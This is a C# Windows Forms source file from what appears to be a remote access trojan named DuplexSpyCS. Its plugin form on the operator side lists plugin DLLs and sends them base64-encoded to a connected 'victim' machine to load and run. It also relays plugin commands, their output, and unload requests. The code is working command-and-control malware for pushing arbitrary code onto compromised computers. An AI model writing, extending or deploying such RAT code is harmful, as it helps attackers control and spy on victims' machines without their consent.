using Microsoft.Web.WebView2.Core;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection.Metadata.Ecma335;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmPlugin : Form
    {
        private clsVictim m_victim { get; set; }

        private string m_szPluginDirectory { get; set; }
        private clsIniManager m_iniMgr = clsStore.ini_manager;
        private List<string> m_lsCommandHistory = new List<string>();

        public frmPlugin(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szPluginDirectory = Path.Combine(Application.StartupPath, "Plugins");
        }

        private clsPlugin.stPluginInfo fnGetPluginInfoFromItem(ListViewItem item) => item.Tag == null ? new clsPlugin.stPluginInfo() : (clsPlugin.stPluginInfo)item.Tag;

        private Dictionary<string, clsPlugin.stPluginInfo> m_dicPluginInfo = new Dictionary<string, clsPlugin.stPluginInfo>();
        private Dictionary<string, clsPlugin.stPluginInfo> m_dicLoadedPlugin = new Dictionary<string, clsPlugin.stPluginInfo>();

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            if (lsMsg[0] == "plugin")
            {
                if (lsMsg[1] == "ls")
                {
                    List<string[]> ls = lsMsg[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).Where(y => !string.IsNullOrEmpty(y)).Select(z => z.Split(',')).ToList();
                    foreach (var s in ls)
                    {
                        if (s.Length != 2)
                            continue;

                        string szName = s[0];
                        string szVersion = s[1];

                        Invoke(new Action(() =>
                        {
                            ListViewItem item = listView1.FindItemWithText(szName);
                            if (item == null)
                            {
                                MessageBox.Show(
                                    "Discovered an unknown plugin: " + szName,
                                    "Unknown Plugin",
                                    MessageBoxButtons.OK,
                                    MessageBoxIcon.Warning
                                );
                            }
                            else
                            {
                                item.SubItems[2].Text = "Loaded";

                                var info = fnGetPluginInfoFromItem(item);
                                m_dicLoadedPlugin.Add(szName, info);

                                fnPrintOK("Load plugin successfully: " + szName);
                            }
                        }));
                    }

                    fnPrintLoadedPlugin();
                }
                else if (lsMsg[1] == "run")
                {
                    string szName = lsMsg[2];
                    int nCode = int.Parse(lsMsg[3]);
                    string szOutput = clsCrypto.b64D2Str(lsMsg[4]);

                    if (nCode == 1)
                        fnPrintOK("Run command successfully:");
                    else
                        fnPrintError("Run command failed:");

                    List<string> lsOutput = szOutput.Split(Environment.NewLine).ToList();
                    foreach (string szLine in lsOutput)
                        fnPrintLine(szLine);
                }
                else if (lsMsg[1] == "load")
                {
                    string szName = lsMsg[2];

                    Invoke(new Action(() =>
                    {
                        ListViewItem item = listView1.FindItemWithText(szName);
                        if (item == null)
                            return;

                        int nCode = int.Parse(lsMsg[3]);
                        if (nCode == 0)
                        {
                            fnPrintError("Cannot load plugin: " + szName);
                            return;
                        }

                        var info = fnGetPluginInfoFromItem(item);
                        item.SubItems[2].Text = "Loaded";
                        m_dicLoadedPlugin.Add(szName, info);

                        fnPrintOK("Load plugin successfully: " + szName);
                    }));
                }
                else if (lsMsg[1] == "unload")
                {
                    string szName = lsMsg[2];
                    int nCode = int.Parse(lsMsg[3]);
                    if (nCode == 0)
                    {
                        string szMsg = clsCrypto.b64D2Str(lsMsg[4]);
                        fnPrintError(szMsg);
                    }

                    fnPrintOK("Unload plugin successfully: " + szName);
                }
            }
        }

        void fnSendLoad(string szName)
        {
            ListViewItem item = listView1.FindItemWithText(szName);
            var plugin = fnGetPluginInfoFromItem(item);

            byte[] abBuffer = File.ReadAllBytes(plugin.szFileName);

            m_victim.fnSendCommand(new string[]
            {
                "plugin",
                "load",
                szName,
                Convert.ToBase64String(abBuffer),
            });
        }

        void fnSendUnload(string szName)
        {
            ListViewItem item = listView1.FindItemWithText(szName);
            var plugin = fnGetPluginInfoFromItem(item);

            m_victim.fnSendCommand(new string[]
            {
                "plugin",
                "unload",
                szName,
            });
        }

        /// <summary>
        /// Refresh listview.
        /// </summary>
        void fnRefresh()
        {
            listView1.Items.Clear();

            m_dicPluginInfo.Clear();
            m_dicLoadedPlugin.Clear();

            foreach (string szDllFileName in Directory.GetFiles(m_szPluginDirectory))
            {
                if (string.Equals(Path.GetExtension(szDllFileName).Trim('.'), "json"))
                    continue;

                string szFileName = Path.GetFileNameWithoutExtension(szDllFileName);
                string szJsonFile = Path.Combine(m_szPluginDirectory, $"{szFileName}.json");

                var szJsonText = File.ReadAllText(szJsonFile);
                var meta = JsonSerializer.Deserialize<clsPlugin.stPluginMeta>(szJsonText);
                if (meta.bIsNull)
                {
                    //todo: show error message.
                    return;
                }

                ListViewItem item = new ListViewItem(meta.Name);
                item.SubItems.Add(meta.Version);
                item.SubItems.Add("Unloaded");
                item.SubItems.Add("-");
                item.SubItems.Add(meta.Description);

                var info = new clsPlugin.stPluginInfo()
                {
                    szFileName = szDllFileName,
                    Meta = meta,
                };

                item.Tag = info;
                m_dicPluginInfo.Add(meta.Name, info);

                listView1.Items.Add(item);

                var list = new List<clsPlugin.stCommandSpec>();
                foreach (var cmd in meta.command)
                {
                    list.Add(new clsPlugin.stCommandSpec()
                    {
                        PluginName = meta.Name,
                        Entry = meta.Entry,
                        Command = cmd.name,
                        Args = cmd.args,
                        Description = cmd.desc,
                    });
                }

                if (!m_victim.m_dicCommandRegistry.ContainsKey(meta.Entry))
                {
                    m_victim.m_dicCommandRegistry[meta.Entry] = list;
                }
            }

            listView1.Refresh();

            toolStripStatusLabel1.Text = $"Plugin[{listView1.Items.Count}]";

            m_victim.SendCommand("plugin|ls");
        }

        void fnPrintLine(string szMsg)
        {
            Invoke(new Action(() =>
            {
                if (szMsg.Length >= 3 && szMsg[0] == '[' && szMsg[2] == ']')
                {
                    string szPrefix = szMsg.Substring(0, 3);
                    szMsg = szMsg.Substring(3).TrimStart();

                    switch (szPrefix)
                    {
                        case "[+]":
                            fnPrintOK(szMsg);
                            return;
                        case "[*]":
                            fnPrintInfo(szMsg);
                            return;
                        case "[-]":
                            fnPrintError(szMsg);
                            return;
                        case "[!]":
                            fnPrintWarning(szMsg);
                            return;
                    }
                }

                richTextBox1.AppendText(szMsg);
                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void fnPrintInfo(string szMsg, bool bShowDate = false)
        {
            Invoke(new Action(() =>
            {
                if (bShowDate)
                {
                    richTextBox1.SelectionColor = Color.Goldenrod;
                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
                }

                richTextBox1.SelectionColor = Color.RoyalBlue;
                richTextBox1.AppendText("[*] ");

                richTextBox1.SelectionColor = Color.White;
                richTextBox1.AppendText(szMsg);

                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void fnPrintOK(string szMsg, bool bShowDate = false)
        {
            Invoke(new Action(() =>
            {
                if (bShowDate)
                {
                    richTextBox1.SelectionColor = Color.Goldenrod;
                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
                }

                richTextBox1.SelectionColor = Color.LimeGreen;
                richTextBox1.AppendText("[+] ");

                richTextBox1.SelectionColor = Color.White;
                richTextBox1.AppendText(szMsg);

                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void fnPrintWarning(string szMsg, bool bShowDate = false)
        {
            Invoke(new Action(() =>
            {
                if (bShowDate)
                {
                    richTextBox1.SelectionColor = Color.Goldenrod;
                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
                }

                richTextBox1.SelectionColor = Color.Yellow;
                richTextBox1.AppendText("[!] ");

                richTextBox1.SelectionColor = Color.White;
                richTextBox1.AppendText(szMsg);

                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void fnPrintError(string szMsg, bool bShowDate = false)
        {
            Invoke(new Action(() =>
            {
                if (bShowDate)
                {
                    richTextBox1.SelectionColor = Color.Goldenrod;
                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
                }

                richTextBox1.SelectionColor = Color.Red;
                richTextBox1.AppendText("[-] ");

                richTextBox1.SelectionColor = Color.White;
                richTextBox1.AppendText(szMsg);

                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void fnPrintTable(DataTable dt)
        {
            Invoke(new Action(() =>
            {
                if (dt == null || dt.Columns.Count == 0)
                    return;

                int[] colWidths = new int[dt.Columns.Count];

                for (int i = 0; i < dt.Columns.Count; i++)
                {
                    colWidths[i] = dt.Columns[i].ColumnName.Length;

                    foreach (DataRow row in dt.Rows)
                    {
                        int len = row[i]?.ToString().Length ?? 0;
                        if (len > colWidths[i])
                            colWidths[i] = len;
                    }
                }

                StringBuilder sb = new StringBuilder();

                for (int i = 0; i < dt.Columns.Count; i++)
                {
                    sb.Append(dt.Columns[i].ColumnName.PadRight(colWidths[i] + 2));
                }
                sb.AppendLine();

                for (int i = 0; i < dt.Columns.Count; i++)
                {
                    sb.Append(new string('-', colWidths[i]) + "  ");
                }
                sb.AppendLine();

                foreach (DataRow row in dt.Rows)
                {
                    for (int i = 0; i < dt.Columns.Count; i++)
                    {
                        string text = row[i]?.ToString() ?? "";
                        sb.Append(text.PadRight(colWidths[i] + 2));
                    }
                    sb.AppendLine();
                }

                richTextBox1.AppendText(sb.ToString());
                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void fnPrintLoadedPlugin()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Loaded Plugins");
            dt.Columns.Add("Command");
            dt.Columns.Add("Description");

            foreach (var szName in m_dicLoadedPlugin.Keys)
            {
                var info = m_dicLoadedPlugin[szName];
                dt.Rows.Add(szName, info.Meta.Entry, info.Meta.Description);
            }

            fnPrintTable(dt);

            if (m_dicLoadedPlugin.Keys.Count == 0)
            {
                fnPrintWarning("Loaded plugin: 0");
            }
            else
            {
                fnPrintInfo("Loaded plugin: " + m_dicLoadedPlugin.Keys.Count.ToString());
            }
        }

        void fnCommandHandler(List<string> lsArgs)
        {
            richTextBox1.AppendText("> " + string.Join(' ', lsArgs));
            richTextBox1.AppendText(Environment.NewLine);

            var dic = m_victim.m_dicCommandRegistry;
            if (lsArgs[0] == "show")
            {
                DataTable dt = new DataTable();
                dt.Columns.Add("Available Plugins");
                dt.Columns.Add("Command");
                dt.Columns.Add("Description");

                foreach (string szName in m_dicPluginInfo.Keys)
                {
                    var info = m_dicPluginInfo[szName];
                    dt.Rows.Add(szName, info.Meta.Entry, info.Meta.Description);
                }

                fnPrintTable(dt);

                if (m_dicPluginInfo.Keys.Count == 0)
                {
                    fnPrintInfo("Available plugin: 0");
                }
                else
                {
                    fnPrintInfo("Available plugin: " + m_dicPluginInfo.Keys.Count.ToString());
                }
            }
            else if (lsArgs[0] == "loaded")
            {
                fnPrintLoadedPlugin();
            }
            else if (lsArgs[0] == "load")
            {
                if (lsArgs.Count < 2)
                {
                    //todo: print usage.
                    return;
                }

                string szOption = lsArgs[1];
                if (szOption == "all")
                {
                    foreach (var plugin in m_dicPluginInfo.Values)
                    {
                        fnSendLoad(plugin.Meta.Name);
                    }
                }
                else //Plugin
                {
                    if (m_dicLoadedPlugin.ContainsKey(szOption))
                    {
                        fnPrintWarning("Command is aborted: This plugin has been loaded");
                        return;
                    }
                    else if (!m_dicPluginInfo.Keys.Contains(szOption))
                    {
                        fnPrintError("Cannot find plugin: " + szOption);
                        return;
                    }

                    fnSendLoad(szOption);
                }
            }
            else if (lsArgs[0] == "unload")
            {
                if (lsArgs.Count < 2)
                {
                    //todo: print usage.
                    return;
                }

                string szOption = lsArgs[1];
                if (szOption == "all")
                {
                    foreach (var plugin in m_dicPluginInfo.Values)
                    {
                        fnSendUnload(plugin.Meta.Name);
                    }
                }
                else //Plugin
                {
                    if (!m_dicLoadedPlugin.Keys.Contains(szOption))
                    {
                        fnPrintError("This plugin has not been loaded.");
                        return;
                    }
                    else if (!m_dicPluginInfo.Keys.Contains(szOption))
                    {
                        fnPrintError("Cannot find plugin: " + szOption);
                        return;
                    }

                    fnSendUnload(szOption);
                }
            }
            else if (lsArgs[0] == "help")
            {
                //todo: print usage.
            }
            else if (lsArgs[0] == "clear")
            {
                richTextBox1.Clear();
            }
            else //Plugin commands.
            {
                string szEntry = lsArgs[0];
                if (!m_victim.m_dicCommandRegistry.ContainsKey(szEntry))
                {
                    fnPrintError("Cannot find command: " + szEntry);
                    return;
                }

                if (lsArgs.Count == 1)
                {
                    //todo: print usage message.
                    return;
                }

                var spec = dic[szEntry].Where(x => string.Equals(x.Entry, szEntry)).FirstOrDefault();

                List<string> lsPayload = new List<string>();
                for (int i = 1; i < lsArgs.Count; i++)
                {
                    if (!lsArgs[i].Contains('='))
                        lsArgs[i] += "=dummy";

                    lsPayload.Add(lsArgs[i]);
                }

                m_victim.fnSendCommand(new string[]
                {
                    "plugin",
                    "run",
                    szEntry,
                    string.Join(",", lsPayload.Select(x => clsCrypto.b64E2Str(x)))
                });
            }
        }

        void fnSetup()
        {
            m_victim.m_listener.ReceivedDecoded += fnRecv;

            richTextBox1.Font = new Font("Consolas", 11);
            textBox1.Tag = 0;

            fnRefresh();
        }

        private void frmPlugin_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmPlugin_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        //Load
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            var lsPlugin = listView1.Items.Cast<ListViewItem>().Select(x => fnGetPluginInfoFromItem(x)).ToList();
            foreach (var plugin in lsPlugin)
            {
                if (!plugin.bIsValid)
                    continue;

                fnSendLoad(plugin.Meta.Name);
            }
        }

        //Unload
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            var lsPlugin = listView1.Items.Cast<ListViewItem>().Select(x => fnGetPluginInfoFromItem(x)).ToList();
            foreach (var plugin in lsPlugin)
            {
                if (!plugin.bIsValid)
                    continue;

                fnSendUnload(plugin.Meta.Name);
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            void fnCursorGotoTheEnd()
            {
                textBox1.SelectionStart = textBox1.Text.Length + 1;
                textBox1.SelectionLength = 0;
                textBox1.Focus();
            }

            if (e.KeyCode == Keys.Enter)
            {
                if (!string.IsNullOrEmpty(textBox1.Text))
                {
                    m_lsCommandHistory.Add(textBox1.Text);
                    textBox1.Tag = m_lsCommandHistory.Count;

                    List<string> lsArgs = textBox1.Text.Split(' ').ToList();
                    fnCommandHandler(lsArgs);
                }

                textBox1.Text = string.Empty;
            }
            else if (e.KeyCode == Keys.Up)
            {
                if (m_lsCommandHistory.Count == 0)
                    return;

                int nIndex = (int)textBox1.Tag;
                if (nIndex == 0)
                {
                    textBox1.Text = m_lsCommandHistory[0];
                    fnCursorGotoTheEnd();
                    return;
                }

                textBox1.Text = m_lsCommandHistory[nIndex - 1];
                textBox1.Tag = nIndex - 1;

                fnCursorGotoTheEnd();
            }
            else if (e.KeyCode == Keys.Down)
            {
                if (m_lsCommandHistory.Count == 0)
                    return;

                int nIndex = (int)textBox1.Tag;
                if (nIndex == m_lsCommandHistory.Count)
                {
                    textBox1.Text = m_lsCommandHistory.Last();
                    fnCursorGotoTheEnd();
                    return;
                }

                textBox1.Text = m_lsCommandHistory[nIndex];
                textBox1.Tag = nIndex + 1;

                fnCursorGotoTheEnd();
            }
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            richTextBox1.ScrollToCaret();
        }
    }
}
